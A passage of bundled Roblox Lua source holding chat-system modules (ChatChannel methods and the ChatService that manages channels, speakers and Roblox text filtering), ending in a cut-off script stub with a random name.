				local messageObj = self:InternalCreateMessageObject(message, nil, true, extraData)
				speaker:InternalSendSystemMessage(messageObj, self.Name)
			elseif RunService:IsStudio() then
				warn(string.format("Speaker '%s' is not in channel '%s' and cannot be sent a system message", speakerName, self.Name))
			end
		end
		
		function methods:SendMessageObjToFilters(message, messageObj, fromSpeaker)
			local oldMessage = messageObj.Message
			messageObj.Message = message
			self:InternalDoMessageFilter(fromSpeaker.Name, messageObj, self.Name)
			self.ChatService:InternalDoMessageFilter(fromSpeaker.Name, messageObj, self.Name)
			local newMessage = messageObj.Message
			messageObj.Message = oldMessage
			return newMessage
		end
		
		function methods:CanCommunicateByUserId(userId1, userId2)
			if RunService:IsStudio() then
				return true
			end
			-- UserId is set as 0 for non player speakers.
			if userId1 == 0 or userId2 == 0 then
				return true
			end
			local success, canCommunicate = pcall(function()
				return Chat:CanUsersChatAsync(userId1, userId2)
			end)
			return success and canCommunicate
		end
		
		function methods:CanCommunicate(speakerObj1, speakerObj2)
			local player1 = speakerObj1:GetPlayer()
			local player2 = speakerObj2:GetPlayer()
			if player1 and player2 then
				return self:CanCommunicateByUserId(player1.UserId, player2.UserId)
			end
			return true
		end
		
		function methods:SendMessageToSpeaker(message, speakerName, fromSpeakerName, extraData)
			local speakerTo = self.Speakers[speakerName]
			local speakerFrom = self.ChatService:GetSpeaker(fromSpeakerName)
			if speakerTo and speakerFrom then
				local isMuted = speakerTo:IsSpeakerMuted(fromSpeakerName)
				if isMuted then
					return
				end
		
				if not self:CanCommunicate(speakerTo, speakerFrom) then
					return
				end
		
				-- We need to claim the message is filtered even if it not in this case for compatibility with legacy client side code.
				local isFiltered = speakerName == fromSpeakerName
				local messageObj = self:InternalCreateMessageObject(message, fromSpeakerName, isFiltered, extraData)
				message = self:SendMessageObjToFilters(message, messageObj, fromSpeakerName)
				speakerTo:InternalSendMessage(messageObj, self.Name)
		
				local textContext = self.Private and Enum.TextFilterContext.PrivateChat or Enum.TextFilterContext.PublicChat
				local filterSuccess, isFilterResult, filteredMessage = self.ChatService:InternalApplyRobloxFilterNewAPI(
					messageObj.FromSpeaker,
					message,
					textContext
				)
				if (filterSuccess) then
					messageObj.FilterResult = filteredMessage
					messageObj.IsFilterResult = isFilterResult
					messageObj.IsFiltered = true
					speakerTo:InternalSendFilteredMessageWithFilterResult(messageObj, self.Name)
				end
			elseif RunService:IsStudio() then
				warn(string.format("Speaker '%s' is not in channel '%s' and cannot be sent a message", speakerName, self.Name))
			end
		end
		
		function methods:KickSpeaker(speakerName, reason)
			local speaker = self.ChatService:GetSpeaker(speakerName)
			if (not speaker) then
				error("Speaker \"" .. speakerName .. "\" does not exist!")
			end
		
			local messageToSpeaker = ""
			local messageToChannel = ""
			local playerName = speaker:GetNameForDisplay()
		
			if (reason) then
				messageToSpeaker = string.format("You were kicked from '%s' for the following reason(s): %s", self.Name, reason)
				messageToChannel = string.format("%s was kicked for the following reason(s): %s", playerName, reason)
			else
				messageToSpeaker = string.format("You were kicked from '%s'", self.Name)
				messageToChannel = string.format("%s was kicked", playerName)
			end
		
			self:SendSystemMessageToSpeaker(messageToSpeaker, speakerName)
			speaker:LeaveChannel(self.Name)
			self:SendSystemMessage(messageToChannel)
		end
		
		function methods:MuteSpeaker(speakerName, reason, length)
			local speaker = self.ChatService:GetSpeaker(speakerName)
			if (not speaker) then
				error("Speaker \"" .. speakerName .. "\" does not exist!")
			end
		
			self.Mutes[speakerName:lower()] = (length == 0 or length == nil) and 0 or (os.time() + length)
		
			if (reason) then
				local playerName = speaker:GetNameForDisplay()
		
				self:SendSystemMessage(string.format("%s was muted for the following reason(s): %s", playerName, reason))
			end
		
			local success, err = pcall(function() self.eSpeakerMuted:Fire(speakerName, reason, length) end)
			if not success and err then
				print("Error mutting speaker: " ..err)
			end
		
			local spkr = self.ChatService:GetSpeaker(speakerName)
			if (spkr) then
				local success, err = pcall(function() spkr.eMuted:Fire(self.Name, reason, length) end)
				if not success and err then
					print("Error mutting speaker: " ..err)
				end
			end
		
		end
		
		function methods:UnmuteSpeaker(speakerName)
			local speaker = self.ChatService:GetSpeaker(speakerName)
			if (not speaker) then
				error("Speaker \"" .. speakerName .. "\" does not exist!")
			end
		
			self.Mutes[speakerName:lower()] = nil
		
			local success, err = pcall(function() self.eSpeakerUnmuted:Fire(speakerName) end)
			if not success and err then
				print("Error unmuting speaker: " ..err)
			end
		
			local spkr = self.ChatService:GetSpeaker(speakerName)
			if (spkr) then
				local success, err = pcall(function() spkr.eUnmuted:Fire(self.Name) end)
				if not success and err then
					print("Error unmuting speaker: " ..err)
				end
			end
		end
		
		function methods:IsSpeakerMuted(speakerName)
			return (self.Mutes[speakerName:lower()] ~= nil)
		end
		
		function methods:GetSpeakerList()
			local list = {}
			for i, speaker in pairs(self.Speakers) do
				table.insert(list, speaker.Name)
			end
			return list
		end
		
		function methods:RegisterFilterMessageFunction(funcId, func, priority)
			if self.FilterMessageFunctions:HasFunction(funcId) then
				error(string.format("FilterMessageFunction '%s' already exists", funcId))
			end
			self.FilterMessageFunctions:AddFunction(funcId, func, priority)
		end
		
		function methods:FilterMessageFunctionExists(funcId)
			return self.FilterMessageFunctions:HasFunction(funcId)
		end
		
		function methods:UnregisterFilterMessageFunction(funcId)
			if not self.FilterMessageFunctions:HasFunction(funcId) then
				error(string.format("FilterMessageFunction '%s' does not exists", funcId))
			end
			self.FilterMessageFunctions:RemoveFunction(funcId)
		end
		
		function methods:RegisterProcessCommandsFunction(funcId, func, priority)
			if self.ProcessCommandsFunctions:HasFunction(funcId) then
				error(string.format("ProcessCommandsFunction '%s' already exists", funcId))
			end
			self.ProcessCommandsFunctions:AddFunction(funcId, func, priority)
		end
		
		function methods:ProcessCommandsFunctionExists(funcId)
			return self.ProcessCommandsFunctions:HasFunction(funcId)
		end
		
		function methods:UnregisterProcessCommandsFunction(funcId)
			if not self.ProcessCommandsFunctions:HasFunction(funcId) then
				error(string.format("ProcessCommandsFunction '%s' does not exist", funcId))
			end
			self.ProcessCommandsFunctions:RemoveFunction(funcId)
		end
		
		local function ShallowCopy(table)
			local copy = {}
			for i, v in pairs(table) do
				copy[i] = v
			end
			return copy
		end
		
		function methods:GetHistoryLog()
			return ShallowCopy(self.ChatHistory)
		end
		
		function methods:GetHistoryLogForSpeaker(speaker)
			local userId = -1
			local player = speaker:GetPlayer()
			if player then
				userId = player.UserId
			end
			local chatlog = {}
		
			for i = 1, #self.ChatHistory do
				local logUserId = self.ChatHistory[i].SpeakerUserId
				if self:CanCommunicateByUserId(userId, logUserId) then
					local messageObj = ShallowCopy(self.ChatHistory[i])
		
					--// Since we're using the new filter API, we need to convert the stored filter result
					--// into an actual string message to send to players for their chat history.
					--// System messages aren't filtered the same way, so they just have a regular
					--// text value in the Message field.
					if (messageObj.MessageType == ChatConstants.MessageTypeDefault or messageObj.MessageType == ChatConstants.MessageTypeMeCommand) then
						local filterResult = messageObj.FilterResult
						if (messageObj.IsFilterResult) then
							if (player) then
								messageObj.Message = filterResult:GetChatForUserAsync(player.UserId)
							else
								messageObj.Message = filterResult:GetNonChatStringForBroadcastAsync()
							end
						else
							messageObj.Message = filterResult
						end
					end
		
					table.insert(chatlog, messageObj)
				end
			end
			return chatlog
		end
		
		--///////////////// Internal-Use Methods
		--//////////////////////////////////////
		function methods:InternalDestroy()
			for i, speaker in pairs(self.Speakers) do
				speaker:LeaveChannel(self.Name)
			end
		
			self.eDestroyed:Fire()
		
			self.eDestroyed:Destroy()
			self.eMessagePosted:Destroy()
			self.eSpeakerJoined:Destroy()
			self.eSpeakerLeft:Destroy()
			self.eSpeakerMuted:Destroy()
			self.eSpeakerUnmuted:Destroy()
		end
		
		function methods:InternalDoMessageFilter(speakerName, messageObj, channel)
			local filtersIterator = self.FilterMessageFunctions:GetIterator()
			for funcId, func, priority in filtersIterator do
				local success, errorMessage = pcall(function()
					func(speakerName, messageObj, channel)
				end)
		
				if not success then
					warn(string.format("DoMessageFilter Function '%s' failed for reason: %s", funcId, errorMessage))
				end
			end
		end
		
		function methods:InternalDoProcessCommands(speakerName, message, channel)
			local commandsIterator = self.ProcessCommandsFunctions:GetIterator()
			for funcId, func, priority in commandsIterator do
				local success, returnValue = pcall(function()
					local ret = func(speakerName, message, channel)
					if type(ret) ~= "boolean" then
						error("Process command functions must return a bool")
					end
					return ret
				end)
		
				if not success then
					warn(string.format("DoProcessCommands Function '%s' failed for reason: %s", funcId, returnValue))
				elseif returnValue then
					return true
				end
			end
		
			return false
		end
		
		function methods:InternalPostMessage(fromSpeaker, message, extraData)
			if (self:InternalDoProcessCommands(fromSpeaker.Name, message, self.Name)) then return false end
		
			if (self.Mutes[fromSpeaker.Name:lower()] ~= nil) then
				local t = self.Mutes[fromSpeaker.Name:lower()]
				if (t > 0 and os.time() > t) then
					self:UnmuteSpeaker(fromSpeaker.Name)
				else
					self:SendSystemMessageToSpeaker(ChatLocalization:FormatMessageToSend("GameChat_ChatChannel_MutedInChannel","You are muted and cannot talk in this channel"), fromSpeaker.Name)
					return false
				end
			end
		
			local messageObj = self:InternalCreateMessageObject(message, fromSpeaker.Name, false, extraData)
		
			-- allow server to process the unfiltered message string
			messageObj.Message = message
			local processedMessage
			pcall(function()
				processedMessage = Chat:InvokeChatCallback(Enum.ChatCallbackType.OnServerReceivingMessage, messageObj)
			end)
			messageObj.Message = nil
		
			if processedMessage then
		
				-- developer server code's choice to mute the message
				if processedMessage.ShouldDeliver == false then
					return false
				end
				messageObj = processedMessage
			end
		
			message = self:SendMessageObjToFilters(message, messageObj, fromSpeaker)
		
			local sentToList = {}
			for i, speaker in pairs(self.Speakers) do
				local isMuted = speaker:IsSpeakerMuted(fromSpeaker.Name)
				if not isMuted and self:CanCommunicate(fromSpeaker, speaker) then
					table.insert(sentToList, speaker.Name)
					if speaker.Name == fromSpeaker.Name then
						-- Send unfiltered message to speaker who sent the message.
						local cMessageObj = ShallowCopy(messageObj)
						if userShouldMuteUnfilteredMessage then
							cMessageObj.Message = string.rep("_", messageObj.MessageLength)
						else
							cMessageObj.Message = message
						end
						cMessageObj.IsFiltered = true
						-- We need to claim the message is filtered even if it not in this case for compatibility with legacy client side code.
						speaker:InternalSendMessage(cMessageObj, self.Name)
					else
						speaker:InternalSendMessage(messageObj, self.Name)
					end
				end
			end
		
			local success, err = pcall(function() self.eMessagePosted:Fire(messageObj) end)
			if not success and err then
				print("Error posting message: " ..err)
			end
		
			local textFilterContext = self.Private and Enum.TextFilterContext.PrivateChat or Enum.TextFilterContext.PublicChat
			local filterSuccess, isFilterResult, filteredMessage = self.ChatService:InternalApplyRobloxFilterNewAPI(
				messageObj.FromSpeaker,
				message,
				textFilterContext
			)
			if (filterSuccess) then
				messageObj.FilterResult = filteredMessage
				messageObj.IsFilterResult = isFilterResult
			else
				return false
			end
			messageObj.IsFiltered = true
			self:InternalAddMessageToHistoryLog(messageObj)
		
			for _, speakerName in pairs(sentToList) do
				local speaker = self.Speakers[speakerName]
				if (speaker) then
					speaker:InternalSendFilteredMessageWithFilterResult(messageObj, self.Name)
				end
			end
		
			-- One more pass is needed to ensure that no speakers do not recieve the message.
			-- Otherwise a user could join while the message is being filtered who had not originally been sent the message.
			local speakersMissingMessage = {}
			for _, speaker in pairs(self.Speakers) do
				local isMuted = speaker:IsSpeakerMuted(fromSpeaker.Name)
				if not isMuted and self:CanCommunicate(fromSpeaker, speaker) then
					local wasSentMessage = false
					for _, sentSpeakerName in pairs(sentToList) do
						if speaker.Name == sentSpeakerName then
							wasSentMessage = true
							break
						end
					end
					if not wasSentMessage then
						table.insert(speakersMissingMessage, speaker.Name)
					end
				end
			end
		
			for _, speakerName in pairs(speakersMissingMessage) do
				local speaker = self.Speakers[speakerName]
				if speaker then
					speaker:InternalSendFilteredMessageWithFilterResult(messageObj, self.Name)
				end
			end
		
			return messageObj
		end
		
		function methods:InternalAddSpeaker(speaker)
			if (self.Speakers[speaker.Name]) then
				warn("Speaker \"" .. speaker.name .. "\" is already in the channel!")
				return
			end
		
			self.Speakers[speaker.Name] = speaker
			local success, err = pcall(function() self.eSpeakerJoined:Fire(speaker.Name) end)
			if not success and err then
				print("Error removing channel: " ..err)
			end
		end
		
		function methods:InternalRemoveSpeaker(speaker)
			if (not self.Speakers[speaker.Name]) then
				warn("Speaker \"" .. speaker.name .. "\" is not in the channel!")
				return
			end
		
			self.Speakers[speaker.Name] = nil
			local success, err = pcall(function() self.eSpeakerLeft:Fire(speaker.Name) end)
			if not success and err then
				print("Error removing speaker: " ..err)
			end
		end
		
		function methods:InternalRemoveExcessMessagesFromLog()
			local remove = table.remove
			while (#self.ChatHistory > self.MaxHistory) do
				remove(self.ChatHistory, 1)
			end
		end
		
		function methods:InternalAddMessageToHistoryLog(messageObj)
			table.insert(self.ChatHistory, messageObj)
		
			self:InternalRemoveExcessMessagesFromLog()
		end
		
		function methods:GetMessageType(message, fromSpeaker)
			if fromSpeaker == nil then
				return ChatConstants.MessageTypeSystem
			end
			return ChatConstants.MessageTypeDefault
		end
		
		function methods:InternalCreateMessageObject(message, fromSpeaker, isFiltered, extraData)
			local messageType = self:GetMessageType(message, fromSpeaker)
		
			local speakerUserId = -1
			local speakerDisplayName = nil
			local speaker = nil
		
			if fromSpeaker then
				speaker = self.ChatService:GetSpeaker(fromSpeaker)
				if speaker then
					local player = speaker:GetPlayer()
					if player then
						speakerUserId = player.UserId
		
						if ChatSettings.PlayerDisplayNamesEnabled then
							speakerDisplayName = speaker:GetNameForDisplay()
						end
					else
						speakerUserId = 0
					end
				end
			end
		
			local messageObj =
			{
				ID = self.ChatService:InternalGetUniqueMessageId(),
				FromSpeaker = fromSpeaker,
				SpeakerDisplayName = speakerDisplayName,
				SpeakerUserId = speakerUserId,
				OriginalChannel = self.Name,
				MessageLength = string.len(message),
				MessageType = messageType,
				IsFiltered = isFiltered,
				Message = isFiltered and message or nil,
				--// These two get set by the new API. The comments are just here
				--// to remind readers that they will exist so it's not super
				--// confusing if they find them in the code but cannot find them
				--// here.
				--FilterResult = nil,
				--IsFilterResult = false,
				Time = os.time(),
				ExtraData = {},
			}
		
			if speaker then
				for k, v in pairs(speaker.ExtraData) do
					messageObj.ExtraData[k] = v
				end
			end
		
			if (extraData) then
				for k, v in pairs(extraData) do
					messageObj.ExtraData[k] = v
				end
			end
		
			return messageObj
		end
		
		function methods:SetChannelNameColor(color)
			self.ChannelNameColor = color
			for i, speaker in pairs(self.Speakers) do
				speaker:UpdateChannelNameColor(self.Name, color)
			end
		end
		
		function methods:GetWelcomeMessageForSpeaker(speaker)
			if self.GetWelcomeMessageFunction then
				local welcomeMessage = self.GetWelcomeMessageFunction(speaker)
				if welcomeMessage then
					return welcomeMessage
				end
			end
			return self.WelcomeMessage
		end
		
		function methods:RegisterGetWelcomeMessageFunction(func)
			if type(func) ~= "function" then
				error("RegisterGetWelcomeMessageFunction must be called with a function.")
			end
			self.GetWelcomeMessageFunction = func
		end
		
		function methods:UnRegisterGetWelcomeMessageFunction()
			self.GetWelcomeMessageFunction = nil
		end
		
		--///////////////////////// Constructors
		--//////////////////////////////////////
		
		function module.new(vChatService, name, welcomeMessage, channelNameColor)
			local obj = setmetatable({}, methods)
		
			obj.ChatService = vChatService
		
			obj.Name = name
			obj.WelcomeMessage = welcomeMessage or ""
			obj.GetWelcomeMessageFunction = nil
			obj.ChannelNameColor = channelNameColor
		
			obj.Joinable = true
			obj.Leavable = true
			obj.AutoJoin = false
			obj.Private = false
		
			obj.Speakers = {}
			obj.Mutes = {}
		
			obj.MaxHistory = 200
			obj.HistoryIndex = 0
			obj.ChatHistory = {}
		
			obj.FilterMessageFunctions = Util:NewSortedFunctionContainer()
			obj.ProcessCommandsFunctions = Util:NewSortedFunctionContainer()
		
			-- Make sure to destroy added binadable events in the InternalDestroy method.
			obj.eDestroyed = Instance.new("BindableEvent")
			obj.eMessagePosted = Instance.new("BindableEvent")
			obj.eSpeakerJoined = Instance.new("BindableEvent")
			obj.eSpeakerLeft = Instance.new("BindableEvent")
			obj.eSpeakerMuted = Instance.new("BindableEvent")
			obj.eSpeakerUnmuted = Instance.new("BindableEvent")
		
			obj.MessagePosted = obj.eMessagePosted.Event
			obj.SpeakerJoined = obj.eSpeakerJoined.Event
			obj.SpeakerLeft = obj.eSpeakerLeft.Event
			obj.SpeakerMuted = obj.eSpeakerMuted.Event
			obj.SpeakerUnmuted = obj.eSpeakerUnmuted.Event
			obj.Destroyed = obj.eDestroyed.Event
		
			return obj
		end
		
		return module
		
	end[chat_service] = function()
		--	// FileName: ChatService.lua
		--	// Written by: Xsitsu
		--	// Description: Manages creating and destroying ChatChannels and Speakers.
		
		local MAX_FILTER_RETRIES = 3
		local FILTER_BACKOFF_INTERVALS = {50/1000, 100/1000, 200/1000}
		local MAX_FILTER_DURATION = 60
		
		--- Constants used to decide when to notify that the chat filter is having issues filtering messages.
		local FILTER_NOTIFCATION_THRESHOLD = 3 --Number of notifcation failures before an error message is output.
		local FILTER_NOTIFCATION_INTERVAL = 60 --Time between error messages.
		local FILTER_THRESHOLD_TIME = 60 --If there has not been an issue in this many seconds, the count of issues resets.
		
		local module = {}
		
		local RunService = game:GetService("RunService")
		local Chat = game:GetService("Chat")
		local ReplicatedModules = Chat:WaitForChild("ClientChatModules")
		
		local modulesFolder = script.Parent
		local ReplicatedModules = Chat:WaitForChild("ClientChatModules")
		local ChatSettings = require(ReplicatedModules:WaitForChild("ChatSettings"))
		
		local errorTextColor = ChatSettings.ErrorMessageTextColor or Color3.fromRGB(245, 50, 50)
		local errorExtraData = {ChatColor = errorTextColor}
		
		--////////////////////////////// Include
		--//////////////////////////////////////
		local ChatConstants = require(ReplicatedModules:WaitForChild("ChatConstants"))
		
		local ChatChannel = require(modulesFolder:WaitForChild("ChatChannel"))
		local Speaker = require(modulesFolder:WaitForChild("Speaker"))
		local Util = require(modulesFolder:WaitForChild("Util"))
		
		local ChatLocalization = nil
		pcall(function() ChatLocalization = require(game:GetService("Chat").ClientChatModules.ChatLocalization) end)
		ChatLocalization = ChatLocalization or {}
		
		if not ChatLocalization.FormatMessageToSend or not ChatLocalization.LocalizeFormattedMessage then
			function ChatLocalization:FormatMessageToSend(key,default) return default end
		end
		
		local function allSpaces(inputString)
			local testString = string.gsub(inputString, " ", "")
			return string.len(testString) == 0
		end
		
		--////////////////////////////// Methods
		--//////////////////////////////////////
		local methods = {}
		methods.__index = methods
		
		function methods:AddChannel(channelName, autoJoin)
			if (self.ChatChannels[channelName:lower()]) then
				error(string.format("Channel %q alrady exists.", channelName))
			end
		
			local function DefaultChannelCommands(fromSpeaker, message)
				if (message:lower() == "/leave") then
					local channel = self:GetChannel(channelName)
					local speaker = self:GetSpeaker(fromSpeaker)
					if (channel and speaker) then
						if (channel.Leavable) then
							speaker:LeaveChannel(channelName)
							local msg = ChatLocalization:FormatMessageToSend(
								"GameChat_ChatService_YouHaveLeftChannel",
								string.format("You have left channel '%s'", channelName),
								"RBX_NAME",
								channelName)
							speaker:SendSystemMessage(msg, "System")
						else
							speaker:SendSystemMessage(ChatLocalization:FormatMessageToSend("GameChat_ChatService_CannotLeaveChannel","You cannot leave this channel."), channelName)
						end
					end
		
					return true
				end
				return false
			end
		
		
			local channel = ChatChannel.new(self, channelName)
			self.ChatChannels[channelName:lower()] = channel
		
			channel:RegisterProcessCommandsFunction("default_commands", DefaultChannelCommands, ChatConstants.HighPriority)
		
			local success, err = pcall(function() self.eChannelAdded:Fire(channelName) end)
			if not success and err then
				print("Error addding channel: " ..err)
			end
		
			if autoJoin ~= nil then
				channel.AutoJoin = autoJoin
				if autoJoin then
					for _, speaker in pairs(self.Speakers) do
						speaker:JoinChannel(channelName)
					end
				end
			end
		
			return channel
		end
		
		function methods:RemoveChannel(channelName)
			if (self.ChatChannels[channelName:lower()]) then
				local n = self.ChatChannels[channelName:lower()].Name
		
				self.ChatChannels[channelName:lower()]:InternalDestroy()
				self.ChatChannels[channelName:lower()] = nil
		
				local success, err = pcall(function() self.eChannelRemoved:Fire(n) end)
				if not success and err then
					print("Error removing channel: " ..err)
				end
			else
				warn(string.format("Channel %q does not exist.", channelName))
			end
		end
		
		function methods:GetChannel(channelName)
			return self.ChatChannels[channelName:lower()]
		end
		
		
		function methods:AddSpeaker(speakerName)
			if (self.Speakers[speakerName:lower()]) then
				error("Speaker \"" .. speakerName .. "\" already exists!")
			end
		
			local speaker = Speaker.new(self, speakerName)
			self.Speakers[speakerName:lower()] = speaker
		
			local success, err = pcall(function() self.eSpeakerAdded:Fire(speakerName) end)
			if not success and err then
				print("Error adding speaker: " ..err)
			end
		
			return speaker
		end
		
		function methods:InternalUnmuteSpeaker(speakerName)
			for channelName, channel in pairs(self.ChatChannels) do
				if channel:IsSpeakerMuted(speakerName) then
					channel:UnmuteSpeaker(speakerName)
				end
			end
		end
		
		function methods:RemoveSpeaker(speakerName)
			if (self.Speakers[speakerName:lower()]) then
				local n = self.Speakers[speakerName:lower()].Name
		
				self:InternalUnmuteSpeaker(n)
		
				self.Speakers[speakerName:lower()]:InternalDestroy()
				self.Speakers[speakerName:lower()] = nil
		
				local success, err = pcall(function() self.eSpeakerRemoved:Fire(n) end)
				if not success and err then
					print("Error removing speaker: " ..err)
				end
		
			else
				warn("Speaker \"" .. speakerName .. "\" does not exist!")
			end
		end
		
		function methods:GetSpeaker(speakerName)
			return self.Speakers[speakerName:lower()]
		end
		
		function methods:GetSpeakerByUserOrDisplayName(speakerName)
			local speakerByUserName = self.Speakers[speakerName:lower()]
		
			if speakerByUserName then
				return speakerByUserName
			end
		
			for _, potentialSpeaker in pairs(self.Speakers) do
				local player = potentialSpeaker:GetPlayer()
		
				if player and player.DisplayName:lower() == speakerName:lower() then
					return potentialSpeaker
				end
			end
		end
		
		function methods:GetChannelList()
			local list = {}
			for i, channel in pairs(self.ChatChannels) do
				if (not channel.Private) then
					table.insert(list, channel.Name)
				end
			end
			return list
		end
		
		function methods:GetAutoJoinChannelList()
			local list = {}
			for i, channel in pairs(self.ChatChannels) do
				if channel.AutoJoin then
					table.insert(list, channel)
				end
			end
			return list
		end
		
		function methods:GetSpeakerList()
			local list = {}
			for i, speaker in pairs(self.Speakers) do
				table.insert(list, speaker.Name)
			end
			return list
		end
		
		function methods:SendGlobalSystemMessage(message)
			for i, speaker in pairs(self.Speakers) do
				speaker:SendSystemMessage(message, nil)
			end
		end
		
		function methods:RegisterFilterMessageFunction(funcId, func, priority)
			if self.FilterMessageFunctions:HasFunction(funcId) then
				error(string.format("FilterMessageFunction '%s' already exists", funcId))
			end
			self.FilterMessageFunctions:AddFunction(funcId, func, priority)
		end
		
		function methods:FilterMessageFunctionExists(funcId)
			return self.FilterMessageFunctions:HasFunction(funcId)
		end
		
		function methods:UnregisterFilterMessageFunction(funcId)
			if not self.FilterMessageFunctions:HasFunction(funcId) then
				error(string.format("FilterMessageFunction '%s' does not exists", funcId))
			end
			self.FilterMessageFunctions:RemoveFunction(funcId)
		end
		
		function methods:RegisterProcessCommandsFunction(funcId, func, priority)
			if self.ProcessCommandsFunctions:HasFunction(funcId) then
				error(string.format("ProcessCommandsFunction '%s' already exists", funcId))
			end
			self.ProcessCommandsFunctions:AddFunction(funcId, func, priority)
		end
		
		function methods:ProcessCommandsFunctionExists(funcId)
			return self.ProcessCommandsFunctions:HasFunction(funcId)
		end
		
		function methods:UnregisterProcessCommandsFunction(funcId)
			if not self.ProcessCommandsFunctions:HasFunction(funcId) then
				error(string.format("ProcessCommandsFunction '%s' does not exist", funcId))
			end
			self.ProcessCommandsFunctions:RemoveFunction(funcId)
		end
		
		local LastFilterNoficationTime = 0
		local LastFilterIssueTime = 0
		local FilterIssueCount = 0
		function methods:InternalNotifyFilterIssue()
			if (tick() - LastFilterIssueTime) > FILTER_THRESHOLD_TIME then
				FilterIssueCount = 0
			end
			FilterIssueCount = FilterIssueCount + 1
			LastFilterIssueTime = tick()
			if FilterIssueCount >= FILTER_NOTIFCATION_THRESHOLD then
				if (tick() - LastFilterNoficationTime) > FILTER_NOTIFCATION_INTERVAL then
					LastFilterNoficationTime = tick()
					local systemChannel = self:GetChannel("System")
					if systemChannel then
						systemChannel:SendSystemMessage(
							ChatLocalization:FormatMessageToSend(
								"GameChat_ChatService_ChatFilterIssues",
								"The chat filter is currently experiencing issues and messages may be slow to appear."
							),
							errorExtraData
						)
					end
				end
			end
		end
		
		local StudioMessageFilteredCache = {}
		
		--///////////////// Internal-Use Methods
		--//////////////////////////////////////
		--DO NOT REMOVE THIS. Chat must be filtered or your game will face
		--moderation.
		function methods:InternalApplyRobloxFilter(speakerName, message, toSpeakerName) --// USES FFLAG
			if (RunService:IsServer() and not RunService:IsStudio()) then
				local fromSpeaker = self:GetSpeaker(speakerName)
				local toSpeaker = toSpeakerName and self:GetSpeaker(toSpeakerName)
		
				if fromSpeaker == nil then
					return nil
				end
		
				local fromPlayerObj = fromSpeaker:GetPlayer()
				local toPlayerObj = toSpeaker and toSpeaker:GetPlayer()
		
				if fromPlayerObj == nil then
					return message
				end
		
				if allSpaces(message) then
					return message
				end
		
				local filterStartTime = tick()
				local filterRetries = 0
				while true do
					local success, message = pcall(function()
						if toPlayerObj then
							return Chat:FilterStringAsync(message, fromPlayerObj, toPlayerObj)
						else
							return Chat:FilterStringForBroadcast(message, fromPlayerObj)
						end
					end)
					if success then
						return message
					else
						warn("Error filtering message:", message)
					end
					filterRetries = filterRetries + 1
					if filterRetries > MAX_FILTER_RETRIES or (tick() - filterStartTime) > MAX_FILTER_DURATION then
						self:InternalNotifyFilterIssue()
						return nil
					end
					local backoffInterval = FILTER_BACKOFF_INTERVALS[math.min(#FILTER_BACKOFF_INTERVALS, filterRetries)]
					-- backoffWait = backoffInterval +/- (0 -> backoffInterval)
					local backoffWait = backoffInterval + ((math.random()*2 - 1) * backoffInterval)
					wait(backoffWait)
				end
			else
				--// Simulate filtering latency.
				--// There is only latency the first time the message is filtered, all following calls will be instant.
				if not StudioMessageFilteredCache[message] then
					StudioMessageFilteredCache[message] = true
					wait()
				end
				return message
			end
		
			return nil
		end
		
		--// Return values: bool filterSuccess, bool resultIsFilterObject, variant result
		function methods:InternalApplyRobloxFilterNewAPI(speakerName, message, textFilterContext) --// USES FFLAG
			local alwaysRunFilter = false
			local runFilter = RunService:IsServer() and not RunService:IsStudio()
			if (alwaysRunFilter or runFilter) then
		
				local fromSpeaker = self:GetSpeaker(speakerName)
				if fromSpeaker == nil then
					return false, nil, nil
				end
		
				local fromPlayerObj = fromSpeaker:GetPlayer()
				if fromPlayerObj == nil then
					return true, false, message
				end
		
				if allSpaces(message) then
					return true, false, message
				end
		
				local success, filterResult = pcall(function()
					local ts = game:GetService("TextService")
					local result = ts:FilterStringAsync(message, fromPlayerObj.UserId, textFilterContext)
					return result
				end)
				if (success) then
					return true, true, filterResult
				else
					warn("Error filtering message:", message, filterResult)
					self:InternalNotifyFilterIssue()
					return false, nil, nil
				end
			end
		
			--// Simulate filtering latency.
			wait()
			return true, false, message
		end
		
		function methods:InternalDoMessageFilter(speakerName, messageObj, channel)
			local filtersIterator = self.FilterMessageFunctions:GetIterator()
		
			for funcId, func, priority in filtersIterator do
				local success, errorMessage = pcall(function()
					func(speakerName, messageObj, channel)
				end)
		
				if not success then
					warn(string.format("DoMessageFilter Function '%s' failed for reason: %s", funcId, errorMessage))
				end
			end
		end
		
		function methods:InternalDoProcessCommands(speakerName, message, channel)
			local commandsIterator = self.ProcessCommandsFunctions:GetIterator()
		
			for funcId, func, priority in commandsIterator do
				local success, returnValue = pcall(function()
					local ret = func(speakerName, message, channel)
					if type(ret) ~= "boolean" then
						error("Process command functions must return a bool")
					end
					return ret
				end)
		
				if not success then
					warn(string.format("DoProcessCommands Function '%s' failed for reason: %s", funcId, returnValue))
				elseif returnValue then
					return true
				end
			end
		
			return false
		end
		
		function methods:InternalGetUniqueMessageId()
			local id = self.MessageIdCounter
			self.MessageIdCounter = id + 1
			return id
		end
		
		function methods:InternalAddSpeakerWithPlayerObject(speakerName, playerObj, fireSpeakerAdded)
			if (self.Speakers[speakerName:lower()]) then
				error("Speaker \"" .. speakerName .. "\" already exists!")
			end
		
			local speaker = Speaker.new(self, speakerName)
			speaker:InternalAssignPlayerObject(playerObj)
			self.Speakers[speakerName:lower()] = speaker
		
			if fireSpeakerAdded then
				local success, err = pcall(function() self.eSpeakerAdded:Fire(speakerName) end)
				if not success and err then
					print("Error adding speaker: " ..err)
				end
			end
		
			return speaker
		end
		
		function methods:InternalFireSpeakerAdded(speakerName)
			local success, err = pcall(function() self.eSpeakerAdded:Fire(speakerName) end)
			if not success and err then
				print("Error firing speaker added: " ..err)
			end
		end
		
		--///////////////////////// Constructors
		--//////////////////////////////////////
		
		function module.new()
			local obj = setmetatable({}, methods)
		
			obj.MessageIdCounter = 0
		
			obj.ChatChannels = {}
			obj.Speakers = {}
		
			obj.FilterMessageFunctions = Util:NewSortedFunctionContainer()
			obj.ProcessCommandsFunctions = Util:NewSortedFunctionContainer()
		
			obj.eChannelAdded = Instance.new("BindableEvent")
			obj.eChannelRemoved = Instance.new("BindableEvent")
			obj.eSpeakerAdded = Instance.new("BindableEvent")
			obj.eSpeakerRemoved = Instance.new("BindableEvent")
		
			obj.ChannelAdded = obj.eChannelAdded.Event
			obj.ChannelRemoved = obj.eChannelRemoved.Event
			obj.SpeakerAdded = obj.eSpeakerAdded.Event
			obj.SpeakerRemoved = obj.eSpeakerRemoved.Event
		
			obj.ChatServiceMajorVersion = 0
			obj.ChatServiceMinorVersion = 5
		
			return obj
		end
		
		return module.new()
		
	end
}

--// Scripts

-- erjjfxkerfkxdceo
task.spawn(function()
	local script = erjjfxkerfkxdceo
	script.Disabled = true

	script:GetPropertyChangedSignal("Disabled"):Wait()

	local oldreq = require
